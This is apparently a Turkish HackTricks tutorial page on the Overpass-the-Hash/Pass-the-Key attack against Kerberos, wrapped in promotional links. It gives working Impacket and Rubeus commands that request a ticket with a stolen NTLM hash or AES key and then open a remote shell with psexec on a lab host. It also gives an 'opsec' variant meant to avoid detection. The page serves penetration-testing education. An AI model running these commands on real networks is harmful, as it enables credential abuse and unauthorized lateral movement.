# Over Pass the Hash/Pass the Key

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan ileri seviyeye öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'a katılın!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>

## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** saldırısı, geleneksel NTLM protokolünün kısıtlandığı ve Kerberos kimlik doğrulamasının öncelikli olduğu ortamlar için tasarlanmıştır. Bu saldırı, bir kullanıcının NTLM hash veya AES anahtarlarını kullanarak Kerberos biletleri talep ederek ağ içindeki kaynaklara izinsiz erişim sağlar.

Bu saldırıyı gerçekleştirmek için ilk adım, hedeflenen kullanıcının hesabının NTLM hash veya şifresini elde etmektir. Bu bilgiyi elde ettikten sonra, hesap için bir Ticket Granting Ticket (TGT) alınabilir ve saldırganın kullanıcının izinleri olduğu hizmetlere veya makinelerine erişmesine olanak sağlar.

İşlem aşağıdaki komutlarla başlatılabilir:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256 gerektiren senaryolarda, `-aesKey [AES anahtarı]` seçeneği kullanılabilir. Ayrıca, elde edilen bilet smbexec.py veya wmiexec.py gibi çeşitli araçlarla kullanılabilir, saldırının kapsamı genişletilebilir.

_PyAsn1Error_ veya _KDC cannot find the name_ gibi karşılaşılan sorunlar genellikle Impacket kütüphanesinin güncellenmesi veya IP adresi yerine ana bilgisayar adının kullanılmasıyla çözülür, böylece Kerberos KDC ile uyumluluk sağlanır.

Bu teknikle ilgili başka bir yönü gösteren alternatif bir komut dizisi Rubeus.exe kullanılarak gösterilebilir:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Bu yöntem, **Pass the Key** yaklaşımını yansıtmaktadır ve doğrudan kimlik doğrulama amaçlı biletin ele geçirilmesi ve kullanılması üzerinde odaklanmaktadır. Önemli bir nokta, TGT isteğinin başlatılmasıyla birlikte varsayılan olarak RC4-HMAC kullanımını gösteren `4768: Bir Kerberos kimlik doğrulama bileti (TGT) istendi` olayının tetiklendiğidir, ancak modern Windows sistemleri AES256'yı tercih etmektedir.

Operasyonel güvenliğe uyum sağlamak ve AES256'yı kullanmak için aşağıdaki komut uygulanabilir:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Referanslar

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamınızı görmek ister misiniz**? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz**? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter'da** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo'ya](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo'ya](https://github.com/carlospolop/hacktricks-cloud) PR göndererek paylaşın**.

</details>
